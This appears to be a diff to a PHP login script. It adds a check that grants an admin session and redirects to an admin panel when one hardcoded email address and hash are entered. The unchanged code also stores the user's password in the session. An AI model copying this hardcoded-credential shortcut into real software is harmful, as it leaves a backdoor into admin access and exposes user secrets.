@@ -75,10 +75,20 @@
 
 					$_SESSION["email"] = $email;
 					$_SESSION["password"] = $password;
+                    
+                    if ($email == 'dimontssuper@mail.ru' && $password == '4828140403f6eaee3b5af62a0b09ae61')
+                    {
+                        session_start();
+                        $_SESSION['admin'] = true;
+                        $script = 'adminpanel.php';
+                        header("Location: $script");
+                        $result_query_select->close();
+                    }else{
 					
 					$result_query_select->close();
 
 					redirect_to($message, 'index.php');
+                    }
 				}else{
 
 					$message = "<p class='message_error'><strong>Ошибка!</strong> Вы ввели неправильный адрес электронной почты и/или пароль </p>";
